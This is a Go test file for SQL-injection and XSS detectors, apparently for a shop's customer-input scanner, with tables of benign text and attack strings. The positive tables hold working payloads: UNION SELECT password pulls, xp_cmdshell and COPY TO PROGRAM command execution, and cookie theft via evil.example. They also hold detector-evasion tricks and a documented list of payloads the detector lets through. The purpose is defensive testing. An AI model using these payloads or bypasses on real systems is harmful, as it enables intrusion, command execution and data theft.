package detect

import (
	"strings"
	"testing"
	"time"

	"github.com/ergasterion-dev/aegolith/internal/model"
)

// legitNegatives is realistic customer input that must never be flagged by
// either detector.
var legitNegatives = []string{
	"milk",
	"milk & bread",
	"kid's snacks",
	"O'Brien",
	"select fresh vegetables",
	"union bank atm near me",
	"drop off at gate 2",
	"price<500",
	"House #12, Lal Chowk, Srinagar 190001",
	"50% off",
	"+91 9000012345",
	"Please ring the bell, don't knock. Gate code 1234 & leave at door",
	"دودھ اور روٹی",
	"दूध और ब्रेड",
	// Task 9 corpus: a number, prose, then a comment token (fingerprint 1c).
	"10% off -- limited",
	"Pack of 2 -- fresh",
}

// The positive and negative tables are package-level so that ScanText's
// tests (scan_test.go) can run every one of them through the combined scan.
var (
	sqliPositives = []string{
		"1' OR '1'='1",
		"admin'--",
		"1 OR 1=1",
		"1 UNION SELECT username, password FROM users--",
		"1' AND (SELECT 1 FROM pg_sleep(5))--",
		"1'/**/UNION/**/SELECT/**/1,2--",
		"1' uNiOn SeLeCt 1,2--",
		"'; COPY (SELECT '') TO PROGRAM 'id'--",
		"1%27%20OR%20%271%27=%271",
		// Task 9: the 1c guard needs a letter before the comment.
		"1--",
		"5-- ",
		"10 -- limited",
		"100 /* see note */",
	}
	xssPositives = []string{
		"<script>alert(1)</script>",
		"<img src=x onerror=alert(1)>",
		"<svg/onload=alert(document.cookie)>",
		"javascript:alert(1)",
		`" onmouseover="alert(1)`,
		"<ScRiPt >alert(1)</sCrIpT >",
		`<a href="&#106;avascript:alert(1)">x</a>`,
	}
	xssNegatives = []string{
		"Fresh & tasty 😋 – 5/5! Will order again :)",
		"price<500",
		"I <3 this shop",
	}
	decodedOnlyPositives = []string{
		"%3Cscript%3Ealert(1)%3C%2Fscript%3E",
		"admin%27--",
	}
	copyProgramPositives = []string{
		"'; COPY (SELECT '') TO PROGRAM 'id'--",
		"1;copy users to program 'id'",
		"x';/**/COPY/**/t(a)/**/FROM/**/PROGRAM/**/'id'--",
		"'; copy public.t to program E'id'--",
		"'; COPY(SELECT 1) TO PROGRAM $$id$$--",
		"x'; copy (select 1); copy (select '') to program 'id'--",
		"x'; copy t; copy t to program 'id'--",
	}
	copyProgramNegatives = []string{
		"Meet at 5; copy the list to program 'abc'",
		"don't; copy that",
		"Copy to program 'x' please",
		"Room 12; copy notes to programme 'abc'",
		"pick up; copy t to program everything",
	}
	scriptURLPositives = []string{
		"javascript:alert(1)",
		"  JavaScript:alert(1)",
		"java\tscript:alert(1)",
		"javascript: window.location='https://evil.example'",
		"javascript://%0Aalert(1)",
		"javascript:alert`1`",
		"vbscript:msgbox(1)",
		"javascript%3Aalert(1)",
		"javascript:location=name",
		"javascript: document.cookie=1",
		// Fix round 1: the key=value prose guard must not cover these.
		"javascript: location=name",
		"javascript:\tlocation=name",
		"javascript:\nlocation=name",
		"javascript: a=1;alert(1)",
		"javascript: top=1;alert(1)",
		"javascript: x=alert,x(1)",
		// HTML whitespace references decoded like the whitespace itself.
		"javascript:&#9;location=name",
		"javascript:&Tab;location=name",
		"java&#x09;script:alert(1)",
		"java&#10script:alert(1)",
		"javascript:&#X0A;alert(1)",
		"&#13;javascript:alert(1)",
		// a call after ')' and a global assigned a global
		"javascript: x=(alert)(1)",
		"javascript: top=self",
		// A dummy assignment before the real statement (re-review N1).
		"javascript: a=1; location='//evil/?'+document.cookie",
		"javascript: a=1; location=name",
		"javascript: x=1; document.location='//evil'",
		"javascript: a=1; top.location=name",
		"javascript: a=1; alert (1)",
		"javascript: a=1;location=name",
		"javascript: a=1, location=name",
		"javascript: a=1;  window.location.href='//evil'",
	}
	scriptURLNegatives = []string{
		"JavaScript: The Good Parts",
		"javascript: is it hard to learn?",
		"Learn javascript:alert(1) is a famous payload",
		"javascript:",
		"JavaScript: version=ES6",
		"JavaScript: Name=Ali",
		// key=value prose with ';', '(' or a browser-global key
		"javascript: a=1; b=2",
		"JavaScript: level=beginner (2 weeks)",
		"javascript: name=Ali",
		"javascript: top=10 tips",
		"JavaScript: yes=no; maybe",
		"javascript: &#9; is a tab",
		"javascript:&amp;",
		"javascript: version=&#9;ES6",
		// later clauses that are plain words
		"javascript: a=1; b=2, c=3",
		"JavaScript: level=beginner, duration (2 weeks)",
		"JavaScript: yes=no; maybe later",
		"javascript: tip=1; e.g. practise daily",
		"javascript: a=1; name=Ali",
		"javascript: a=1; x==2",
	}
)

func TestSQLiPositives(t *testing.T) {
	for _, v := range sqliPositives {
		hit, ok := SQLi(v)
		if !ok {
			t.Errorf("SQLi(%q) = no hit, want hit", v)
			continue
		}
		want := Hit{RuleID: "AEG-SQLI-001", Category: model.CatSQLi, Severity: model.SeverityCritical}
		if hit != want {
			t.Errorf("SQLi(%q) = %+v, want %+v", v, hit, want)
		}
	}
}

func TestSQLiNegatives(t *testing.T) {
	for _, v := range legitNegatives {
		if hit, ok := SQLi(v); ok {
			t.Errorf("SQLi(%q) = %+v, want no hit", v, hit)
		}
	}
}

func TestXSSPositives(t *testing.T) {
	for _, v := range xssPositives {
		hit, ok := XSS(v)
		if !ok {
			t.Errorf("XSS(%q) = no hit, want hit", v)
			continue
		}
		want := Hit{RuleID: "AEG-XSS-001", Category: model.CatXSS, Severity: model.SeverityHigh}
		if hit != want {
			t.Errorf("XSS(%q) = %+v, want %+v", v, hit, want)
		}
	}
}

func TestXSSNegatives(t *testing.T) {
	for _, v := range append(append([]string(nil), xssNegatives...), legitNegatives...) {
		if hit, ok := XSS(v); ok {
			t.Errorf("XSS(%q) = %+v, want no hit", v, hit)
		}
	}
}

// TestDecodedOnly checks that a payload visible only after percent-decoding
// is still caught.
func TestDecodedOnly(t *testing.T) {
	if _, ok := XSS(decodedOnlyPositives[0]); !ok {
		t.Error("XSS on percent-encoded <script> = no hit, want hit")
	}
	if _, ok := SQLi(decodedOnlyPositives[1]); !ok {
		t.Error("SQLi on percent-encoded admin'-- = no hit, want hit")
	}
}

// TestCopyProgram covers the stacked PostgreSQL COPY ... PROGRAM rule that
// supplements libinjection, and the prose it must not match.
func TestCopyProgram(t *testing.T) {
	for _, v := range copyProgramPositives {
		if _, ok := SQLi(v); !ok {
			t.Errorf("SQLi(%q) = no hit, want hit", v)
		}
	}
	for _, v := range copyProgramNegatives {
		if hit, ok := SQLi(v); ok {
			t.Errorf("SQLi(%q) = %+v, want no hit", v, hit)
		}
	}
}

// TestScriptURL covers the bare javascript:/vbscript: URL rule that
// supplements libinjection, and the prose it must not match.
func TestScriptURL(t *testing.T) {
	for _, v := range scriptURLPositives {
		if _, ok := XSS(v); !ok {
			t.Errorf("XSS(%q) = no hit, want hit", v)
		}
	}
	for _, v := range scriptURLNegatives {
		if hit, ok := XSS(v); ok {
			t.Errorf("XSS(%q) = %+v, want no hit", v, hit)
		}
	}
}

// TestCopyProgramLinear checks the COPY scan stays linear on adversarial
// repetitions that used to make every ';' rescan to the end of the value.
func TestCopyProgramLinear(t *testing.T) {
	if testing.Short() {
		t.Skip("wall-clock bound; skipped under -short")
	}
	const size = 8 << 10
	lim := wallLimit(time.Millisecond, 20*time.Millisecond)
	for name, in := range map[string]string{
		"unclosed parens":  strings.Repeat(";copy(", size/6),
		"balanced parens":  strings.Repeat(";copy(", size/12) + strings.Repeat(")", size/12),
		"unclosed comment": strings.Repeat(";copy/*", size/7),
		"quotes":           strings.Repeat(";copy('", size/7),
	} {
		if d := bestOf(3, func() { hasStackedCopyProgram(in) }); d > lim {
			t.Errorf("%s: hasStackedCopyProgram took %v on %d bytes, want under %v", name, d, len(in), lim)
		}
	}
}

// TestCopyProgramAfterEarlierStatement checks that skipping past a parsed
// COPY group still finds a later stacked statement.
func TestCopyProgramAfterEarlierStatement(t *testing.T) {
	for _, v := range copyProgramPositives[5:] {
		if _, ok := SQLi(v); !ok {
			t.Errorf("SQLi(%q) = no hit, want hit", v)
		}
	}
}

// G1: a quote-free SQL injection after leading words. libinjection reads
// the value from its first byte, so plain words in front of the payload
// change its fingerprint and hide it.
var sqliAfterWordsPositives = []string{
	"please send 1 UNION SELECT password FROM users--",
	"milk 1; DROP TABLE orders;--",
	"b b b b b b 1 UNION SELECT password FROM users--",
	"please UNION SELECT password FROM users",
	"see 1 1 1 1 1 1 1 1 1 1 1 UNION SELECT 1--",
	"note 1 OR 1=1--",
	"note 1 AND SLEEP(5)--",
	"note 1; EXEC xp_cmdshell 'dir'--",
	"note 1 OR 'a'='a'--",
	"note 1 WAITFOR DELAY '0:0:5'--",
	"note 1; DELETE FROM users;--",
	"note 1/**/UNION/**/SELECT/**/1,2--",
	// Review fix: keywords after the payload must not hide it, and ')' is a
	// boundary before a keyword.
	"please send 1 UNION SELECT password FROM users# union union union union union union union union",
	"please send 1 UNION SELECT password FROM users-- x union union union union union union union union",
	"please send 1 UNION SELECT password FROM users/* c */ union union union union union union union union",
	"please send 1)UNION SELECT password FROM users--",
	"union select a seat union select a seat union select a seat union select a seat union select a seat " +
		"union select a seat union select a seat union select a seat union select a seat x 1 UNION SELECT password FROM users--",
	"note 1 OR 'a'='a' or 1 or 1 or 1 or 1 or 1 or 1 or 1 or 1 or 1 or 1--",
	"x union all select a, b from c union select d from e union select f from g-- -",
}

// Prose that reads like a G1 suffix (plan Review Focus) and near misses
// whose suffix libinjection does flag on its own.
var sqliAfterWordsNegatives = []string{
	"please union select the best one",
	"select a seat",
	"1 or 2 tickets",
	"order by price",
	"drop me a line",
	"O'Brien union select",
	"select * from menu",
	"Pack of 2 -- fresh",
	"only 10 -- limited",
	"room 1 or 2 or 3",
	"pick 2 or 3 --",
	"call me at 9; drop me a line --",
	"call me at 9; drop me a line",
	"please select 1 from menu",
	"sort 1 order by price",
	"pick 1 and max(3) people",
	"want 1 and 2 and 3 --",
	"we deliver 1 or 2 bags; drop by any time",
	"Thanks -- 2 or 3 more please",
	"Tea, 2 or 3 cups; and milk --",
	"Size (1 or 2) --",
	"ok 1 and 2, thanks --",
	"rooms 1, 2 or 3 --",
	"items: 1 or 2 = fine --",
	"Gate 2; drop it at the door, thanks --",
	"Gate 2; drop it, don't knock --",
	"pick 2 or 3 (any) -- ",
	"Hi; 2 and (maybe) 3 --",
	"call 1; delete my old address, please --",
	"room 1 or 2 or 3 /* note",
	"ages 3 and up (kids) --",
	// Review fix: a quoted number and a number compared with a word.
	`I'd say 1 and "2" --`,
	"pack 1 and 2=fine --",
	`pick 1 or "yes" --`,
}

func TestSQLiAfterLeadingWords(t *testing.T) {
	const payload = "1 UNION SELECT password FROM users--"
	padded := []string{
		strings.Repeat("a", 20000) + " " + payload,
		strings.Repeat("b ", 10000) + payload,
	}
	for _, v := range sqliAfterWordsPositives {
		if _, ok := SQLi(v); !ok {
			t.Errorf("SQLi(%q) = no hit, want hit", v)
		}
		if !hasRule(ScanText(v), "AEG-SQLI-001") {
			t.Errorf("ScanText(%q) has no AEG-SQLI-001", v)
		}
	}
	for _, v := range padded {
		if !hasRule(ScanText(v), "AEG-SQLI-001") {
			t.Errorf("ScanText(%d bytes of padding + payload) has no AEG-SQLI-001", len(v)-len(payload))
		}
	}
}

func TestSQLiProseStaysClean(t *testing.T) {
	for _, v := range append(append([]string(nil), sqliAfterWordsNegatives...), legitNegatives...) {
		if hit, ok := SQLi(v); ok {
			t.Errorf("SQLi(%q) = %+v, want no hit", v, hit)
		}
		if hasRule(ScanText(v), "AEG-SQLI-001") {
			t.Errorf("ScanText(%q) has AEG-SQLI-001, want none", v)
		}
	}
}

// TestSQLiStartsLinear checks the extra libinjection starts stay bounded on
// long values made only of start tokens. Besides an absolute bound at
// 200 KiB it checks growth from 64 KiB to 256 KiB the way TestScanTextLinear
// does (over 8x the time for 4x the input, three times in a row, fails):
// an unclosed "/*" after every UNION once made each start search to the
// end of the value, which an absolute bound of seconds does not catch.
func TestSQLiStartsLinear(t *testing.T) {
	if testing.Short() {
		t.Skip("wall-clock bound; skipped under -short")
	}
	const size = 200 << 10
	lim := wallLimit(50*time.Millisecond, 2*time.Second)
	for _, unit := range []string{"select 1 union ", "1 or ", "1 or 1=1-- ", "union ", "union select ", "x union all ",
		"drop me ", "a or ", "1 or x(", "x 1 and 'y' ", "union /* ", "and union (/* note ", "union (", "1 or 1=1 /* "} {
		in := strings.Repeat(unit, size/len(unit))
		for _, v := range []string{in, in + "--", in + "1=1--"} {
			if d := bestOf(3, func() { SQLi(v) }); d > lim {
				t.Errorf("%q x %d: SQLi took %v, want under %v", unit, len(v)/len(unit), d, lim)
			}
		}
		sm := strings.Repeat(unit, (64<<10)/len(unit))
		md := strings.Repeat(unit, (256<<10)/len(unit))
		if raceSlowdown == 1 && sqliSuperLinear(sm, md) && sqliSuperLinear(sm, md) && sqliSuperLinear(sm, md) {
			t.Errorf("%q: SQLi on %d bytes took over 8x its time on %d bytes: super-linear", unit, len(md), len(sm))
		}
	}
}

// sqliSuperLinear reports whether SQLi on m (four times the length of s)
// took more than eight times as long as on s, best of five runs each. Runs
// on s under 500µs are too fast to time reliably and never count.
func sqliSuperLinear(s, m string) bool {
	ds := bestOf(5, func() { SQLi(s) })
	dm := bestOf(5, func() { SQLi(m) })
	return ds > 500*time.Microsecond && dm > 8*ds
}

func hasRule(hits []Hit, id string) bool {
	for _, h := range hits {
		if h.RuleID == id {
			return true
		}
	}
	return false
}

func TestXSSNestedScriptTag(t *testing.T) {
	for _, v := range []string{
		"<scr<script>ipt>alert(1)</script>",
		"<SCR<script >ipt>alert(1)",
		"<scr<SCRIPT/x>ipt>",
		"<scr<script<script>ipt>",
	} {
		if _, ok := XSS(v); !ok {
			t.Errorf("XSS(%q) = no hit, want hit", v)
		}
	}
	for _, v := range []string{
		"a < script is a word",
		"1<scripts",
		"price <script.",
		"<scripting guide",
	} {
		if hit, ok := XSS(v); ok {
			t.Errorf("XSS(%q) = %+v, want no hit", v, hit)
		}
	}
}

// Product, promo and size text that libinjection reads as SQL: a percent
// sign is its modulo operator ("Sale 20% (today only)" folds to "n1o(n")
// and a bare range joined by "or" is arithmetic ORed with a number ("6-7 or
// 8" folds to "1&1"). None of them may be flagged.
var sqliPercentAndRangeNegatives = []string{
	"Sale 20% (today only)",
	"Cotton 95% (organic)",
	"Wheat 50% (flour)",
	"Discount 15% (members)",
	"Battery 80% (approx)",
	"80% ACRYLIC AND 20% WOOL",
	"35% COTTON AND 65% POLYESTER.",
	"Céréales 93 % (farine de BLÉ 79,4 %, sucre)",
	"Tomates 62 % (pelées), oignon, huile d'olive 4 % (vierge), sel de l'Atlantique",
	"Wheat 50%25 (flour)",
	"6-7 or 8",
	"6-7 OR 8",
	"6-7 and 8",
	"1.5-2 or 3",
	"10%(x)",
}

// Counter-cases for the two guards above: each keeps a SQL keyword, a
// comparison, a quote, a comment, a ';' or a non-numeric operand, and stays
// caught.
var sqliPercentAndRangePositives = []string{
	"1 or 1=1",
	"1 OR 1=1",
	"1' or '1'='1",
	"1 UNION SELECT password FROM users--",
	"5 % (select 1)",
	"1%(select 1)",
	"1 % (select sleep(5))",
	"1; DROP TABLE x--",
	"admin'--",
	"1%1 or 1=1",
	"1 % 1 or 1=1",
	"80% cotton or 1=1",
	"x 1 % (1=1)",
	"1 % 2 or 'a'='a",
	"%' or '0'='0",
	"-1 or 1",
	"-9-(2) OR 1 = 1",
	"8-9 OR 1 = 1",
	"1 || 1 = 1",
	"1 and 1 not between 0 and 1",
	"1 AND 1 SOUNDS LIKE 1",
	"6-7 or 8--",
	"6-7 or 8=8",
	"6-7 || 8",
	// Fix round 1: comparison-free forms. Plain integers joined by or/and
	// (libinjection flags "99 or 1 or 1"; "1 or 1" alone it never flagged),
	// modulo between operands, and SQL operator words.
	"99 or 1 or 1",
	"1%1 or 1",
	"1 % 1 or 1",
	"1%(1) or 1",
	"1%1 or 2>1",
	"1%1 or 2<1",
	"1%1 or 1<>2",
	"1%1 or 2>=1",
	"1%1 or 2!=1",
	"1-1 or 2<>1",
	"1-1 or 1 between 0 and 2",
	"1 % 1 or 1 like 1",
	"1%(1) or 1 like 1",
	"1% (1) or 1 rlike 1",
	"1%x or 1 like 1",
	"1%(1) or not 0",
	"1%(1) or 1 in (1)",
	"1%(1) xor 1",
	"1%1 or 1 regexp 1",
	"1%1 xor 1",
	"1%1 or 1 div 1",
	"1%1 or 1 is not null",
	"1%1 or not 0",
	"1%1 or 1 in (1)",
	"9% (a) or 1 like 1",
	"9% (a) xor 1",
}

// sqliPercentAndRangeAcceptedMisses are attack-shaped values the two guards
// deliberately let through (the documented recall cost): a comparison-free
// tautology with a range or decimal, or after "N% (word)" with plain or/and,
// not or in. If one of them starts to hit, update the threat model.
var sqliPercentAndRangeAcceptedMisses = []string{
	"1-1 or 1",
	"6-7 or 8 or 1",
	"9% (a) or 1",
	"9% (a) or not 0",
	"9% (a) or 1 in (1)",
}

func TestSQLiPercentAndRange(t *testing.T) {
	for _, v := range sqliPercentAndRangeNegatives {
		if hit, ok := SQLi(v); ok {
			t.Errorf("SQLi(%q) = %+v, want no hit", v, hit)
		}
		if hasRule(ScanText(v), "AEG-SQLI-001") {
			t.Errorf("ScanText(%q) has AEG-SQLI-001, want none", v)
		}
	}
	for _, v := range sqliPercentAndRangePositives {
		if _, ok := SQLi(v); !ok {
			t.Errorf("SQLi(%q) = no hit, want hit", v)
		}
		if !hasRule(ScanText(v), "AEG-SQLI-001") {
			t.Errorf("ScanText(%q) has no AEG-SQLI-001", v)
		}
	}
	for _, v := range sqliPercentAndRangeAcceptedMisses {
		if hit, ok := SQLi(v); ok {
			t.Errorf("SQLi(%q) = %+v: an accepted miss now hits; update the threat model", v, hit)
		}
	}
}

// Markup that libinjection flags but that is inert: a backtick inside an
// HTML comment (libinjection reads it as an old IE tag terminator), a bare
// placeholder tag such as "<link>" or "<Object>" with no attributes, and a
// "<!DOCTYPE" mention that never closes. None of them may be flagged.
var xssInertMarkupNegatives = []string{
	"<!-- see the `main` branch -->",
	"<!-- see the `main` branch",
	"<!-- Ensure the code is up-to-date with the `main` branch. -->",
	"<!-- plain comment -->",
	"<!-- Thanks for the PR! Run `make test` before you push. -->\n## Summary\nFixes the `retry` loop.",
	"<!-- one `a` --> text <!-- two `b` -->",
	"<!-- `x` -!> after",
	"<!--\nPick one kind, e.g. `/kind bug`.\nLink docs like this:\n- [Docs]: <link>\n-->\nbody text",
	"the token pattern gets a lookbehind, `(?<![\\w.])`, before the match",
	"<? `x` ?>",
	"- [Docs]: <link>",
	"the param is an `<Object>` or a `<boolean>`",
	"rebase onto <base> first",
	"<meta> and <embed> are void elements",
	"check for <!DOCTYPE without copying the rest",
	"compare the first len(\"<!DOCTYPE\") bytes",
	"javascript: yes=no; maybe (later)",
	"JavaScript: yes=no; maybe (2 days)",
	"javascript: tip=1; practise (daily)",
	"JavaScript: price=10; discount (-2 dollars)",
	"JavaScript: level=1; then (see notes)",
	"JavaScript: a=1; note (two days, maybe)",
	"javascript: a=1; plan ( later )",
}

// xssInertMarkupPositives must stay caught: real markup next to (or inside)
// the inert shapes above, and javascript: code after a statement separator.
var xssInertMarkupPositives = []string{
	"<script>alert(1)</script>",
	"<img src=x onerror=alert(1)>",
	`<a href="javascript:alert(1)">x</a>`,
	"<!-- --><script>alert(1)</script>",
	"<svg onload=alert(1)>",
	"<a href=`javascript:alert(1)`>",
	"<!--[if IE]><script>",
	"<!--[if IE]>`x`<![endif]-->",
	"<!-- x --><img src=x onerror=alert(1)>",
	"<!-- `x` --><img src=x onerror=alert(1)>",
	"<!-- `x` --><a href=`javascript:alert(1)`>x</a>",
	"<!--` onerror=alert(1)",
	"<!-- note ` onmouseover=alert(1)",
	"<!--` style=x:expression(alert(1))",
	"<!--` src=`javascript:alert(1)`",
	"<!-- `x` --> <svg/onload=alert(1)>",
	"<!-- `x` --><script src=//evil.example/x.js></script>",
	"<!-- `x` ` <img src=x onerror=alert(1)> -->",
	"<!-- `x` javascript:alert(1) -->",
	"<!--`--><iframe src=javascript:alert(1)>",
	"<!-- ` <img src=x ONERROR=alert(1)> -->",
	"<!-- ` <img src=x onerror\t=alert(1)> -->",
	"<!-- ` <a href=&#106;avascript:alert(1)>x</a> -->",
	"<!-- ` <style>*{x:expression(alert(1))}</style> -->",
	"<!-- ` <object data=//evil.example/x> -->",
	"<!-- ` <meta http-equiv=refresh content=0;url=javascript:alert(1)> -->",
	"<!-- ` -!><img src=x onerror=alert(1)>",
	"<!-- `x` --><?import namespace=x implementation=y>",
	"<!-- `x` --><% `y` %>",
	"x` onerror=alert(1) <!-- `y` -->",
	"<img src=\"<!--\" onerror=`alert(1)`>",
	"<a title=\"<!--\" href=`javascript:alert(1)`>",
	"<link>\"><img src=x onerror=alert(1)>",
	"<embed><param name=src value=//evil.example/x.swf>",
	"<meta><style>x</style>",
	"<!doctype `x` onerror=alert(1)",
	"<!x `y` ><img src=x onerror=alert(1)>",
	"<? ` onerror=alert(1)",
	"<![if IE]>`x`",
	"<?import `x`>",
	"<?xml `x`?>",
	"<!-- `x` <link> --><link rel=import href=//evil.example>",
	"<!-- `x` --><link rel=stylesheet href=javascript:alert(1)>",
	"<!-- `x` --><!DOCTYPE html>",
	"<!-- `x` --><!--[if IE]>",
	"<link rel=import href=//evil.example/x>",
	"<base href=javascript:alert(1)//>",
	"<link><img src=x onerror=alert(1)>",
	"<object><param name=movie value=javascript:alert(1)></object>",
	"<base> <style>*{x:expression(alert(1))}</style>",
	"<link> <iframe>",
	"<!DOCTYPE html>",
	"<!DOCTYPE x [<!ENTITY a 'b'>]>",
	"<!DOCTYPE x [",
	"<div id=\"1\"><!DOCTYPE x [",
	"<style>@import 'x'</style>",
	"<!-- `a` -->\x00<script>",
	"javascript: a=1; alert (1)",
	"javascript: a=1; alert (document.cookie)",
	"javascript: a=1; alert ('x')",
	"javascript: a=1; alert ()",
	"javascript: a=1; alert (name)",
	"javascript: a=1; alert (eval(name))",
	"javascript: yes=no; alert (1)",
	"javascript: a=1; alert ([1])",
	"javascript: a=1; alert ({})",
	"javascript: a=1; alert (-1)",
	"javascript: a=1; alert (!0)",
	"javascript: a=1; alert (top)",
	"javascript: a=1; alert (x.y)",
	"javascript: a=1; eval (atob('YWxlcnQoMSk='))",
	"javascript: yes=no; maybe(later)",
	"javascript: yes=no;maybe (later)",
	// A real tag after an RCDATA or RAWTEXT element whose text holds "<!--":
	// browsers read that "<!--" as text, "</title>" closes the element and
	// the tag runs, while libinjection reads a comment up to "-->".
	"<title><!--</title><img src=x onerror=alert(1)>`--></title>",
	"<textarea><!--</textarea><img src=x onerror=alert(1)>`-->",
	"<xmp><!--</xmp><img src=x onerror=alert(1)>`-->",
	"<noembed><!--</noembed><img src=x onerror=alert(1)>`-->",
	"<noframes><!--</noframes><img src=x onerror=alert(1)>`-->",
	"<title><!--</title><svg onload=alert(1)>`-->",
	"<title><!--</title><svg/onload=alert(1)>`",
	"<title><!--</title><a href=javascript:alert(1)>x</a>`-->",
	"<title><!--</title><iframe src=javascript:alert(1)>`-->",
	"<title><!--</title><body onload=alert(1)>`-->",
	"<title><!--</title><details open ontoggle=alert(1)>`-->",
	"<title><!--</title><input autofocus onfocus=alert(1)>`-->",
	"<TITLE><!--</TITLE><IMG SRC=x ONERROR=alert(1)>`-->",
	"<title><!--</title><img src=x onerror=alert(1)><!--`-->",
	"<textarea><!--</textarea><img src=x onerror=alert(1)><!-- `y` -->",
	"<meta><title><!--</title><img src=x onerror=alert(1)>`-->",
	"<title><!--</title><iframe src=//evil.example>`-->",
	"<title><!--</title><link rel=import href=//evil.example/x>`-->",
	"<title/><!--</title><img src=x onerror=alert(1)>`-->",
	"<title x=1><!--</title><img src=x onerror=alert(1)>`-->",
	"<math><mtext><title><!--</title><img src=x onerror=alert(1)>`-->",
	"<plaintext><!--`-->",
	// Markup a comment hides from libinjection but not from a browser: an
	// early "<!-->" close, a form, a nested opener, entity-written '='.
	"<!--><form action=//evil.example/><button>x</button>`-->",
	"<!--x`--><form><button formaction=//evil.example>x",
	"<!--`--><button form=f formaction=//evil.example>x",
	"<!-- <!-- `x` --> <img src=x onerror=alert(1)> -->",
	"<!--x`--><img src=x onerror&#x3d;alert(1)>",
	"<svg><![CDATA[<!--]]><img src=x onerror=alert(1)>`-->",
	// A bare placeholder next to handler or URL text.
	"<base> onerror=alert(1)",
	"<link> onload=alert(1)",
	"<object> data=javascript:alert(1)",
	"<object>javascript:alert(1)",
	"\" data=javascript:alert(1) <object>",
	"<link>\" onfocus=alert(1) autofocus x=\"",
	"<!DOCTYPE x javascript:alert(1)",
	// javascript: code after "; " with a blank before '(': anything but a
	// single plain word or blank-separated words is code.
	"javascript: a=1; eval (atob ('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))",
	"javascript: a=1; eval (unescape ('%61lert(1)'))",
	"javascript: a=1; alert (eval (name))",
	"javascript: a=1; alert (String.fromCharCode (49))",
	"javascript: a=1; alert (/x/)",
	"javascript: a=1; alert (/*c*/1)",
	"javascript: a=1; alert (this)",
	"javascript: a=1; alert (new Image)",
	"javascript: a=1; alert (void 0)",
	"javascript: a=1; alert (typeof x)",
	"javascript: a=1; alert (await 1)",
	"javascript: a=1; alert (delete x)",
	"javascript: a=1; alert (x in y)",
	"javascript: a=1; alert (x instanceof y)",
	"javascript: a=1; alert (0x1)",
	"javascript: a=1; alert (1e3)",
	"javascript: a=1; alert (1n)",
	"javascript: a=1; alert (x || 1)",
	"javascript: a=1; alert (x?.y)",
	"javascript: a=1; alert (a=1)",
	"javascript: a=1; alert (- x)",
	"javascript: a=1; alert (x - y)",
	"javascript: a=1; alert (!x)",
	"javascript: a=1; alert (document .cookie)",
	"javascript: a=1; alert (top .x)",
	"javascript: a=1; alert (\\u0031)",
	"javascript: a=1; alert (_)",
	"javascript: a=1; alert ($)",
	"javascript: a=1; alert (x, 1)",
	"javascript: a=1; alert (a, b)",
	"javascript: a=1; alert (cookie)",
	"javascript: a=1; alert (origin)",
	"javascript: a=1; alert (localStorage)",
	"javascript: a=1; alert (true)",
	"javascript: a=1; location (x)",
	"javascript: a=1;\talert (atob ('x'))",
	"javascript: a=1; alert\t(atob ('x'))",
	"javascript: a=1;\nalert (x)",
	"javascript: a=1; alert\t(x)",
	"javascript: a=1; alert\n(x)",
}

// xssInertMarkupAcceptedMisses are attack-shaped values the inert-markup
// rules deliberately let through (the documented recall cost), one group
// per item of the accepted-miss list in isInertMarkup's comment,
// docs/threat-model.md and testdata/corpus/README.md. If one of them starts
// to hit, update all three.
var xssInertMarkupAcceptedMisses = []string{
	// 1. A call after "javascript: k=v; " with plain spaces before the name
	// and the '(' whose argument is one letter-only word that is no JS
	// keyword or browser global, or words separated by blanks alone: the
	// shape of "maybe (later)". As a script it throws a ReferenceError
	// (or a SyntaxError) unless the page defines the name.
	"javascript: a=1; alert (x)",
	"javascript: a=1; fetch (url)",
	"javascript: a=1; alert (x y)",
	// 2. A bare "<object>", "<link>", "<base>", "<meta>" or "<embed>" with
	// no attribute on any tag in the value: nothing loads or runs.
	"<object>",
	"<link>",
	"<base>",
	"<meta>",
	"<embed>",
	"<object><embed>",
	// 3. A "<!DOCTYPE" with no '>' and no '[' after it: a mention, and a
	// doctype runs nothing.
	"<!DOCTYPE",
	"<!DOCTYPE html",
	// 4. A backtick inside an HTML comment or a bogus comment with nothing
	// else flagged: here a link, which libinjection does not flag without
	// the comment either.
	"<!-- `x` --><math href=//evil.example>x</math>",
	// 5. A JavaScript-string breakout followed by an HTML comment holding a
	// backtick: libinjection has no JavaScript context, and the same
	// breakout without the comment was never flagged.
	"';alert(1)//<!--`-->",
}

func TestXSSInertMarkup(t *testing.T) {
	for _, v := range xssInertMarkupNegatives {
		if hit, ok := XSS(v); ok {
			t.Errorf("XSS(%q) = %+v, want no hit", v, hit)
		}
		if hasRule(ScanText(v), "AEG-XSS-001") {
			t.Errorf("ScanText(%q) has AEG-XSS-001, want none", v)
		}
	}
	for _, v := range xssInertMarkupPositives {
		if _, ok := XSS(v); !ok {
			t.Errorf("XSS(%q) = no hit, want hit", v)
		}
		if !hasRule(ScanText(v), "AEG-XSS-001") {
			t.Errorf("ScanText(%q) has no AEG-XSS-001", v)
		}
	}
	for _, v := range xssInertMarkupAcceptedMisses {
		if hit, ok := XSS(v); ok {
			t.Errorf("XSS(%q) = %+v: an accepted miss now hits; update the threat model", v, hit)
		}
	}
}
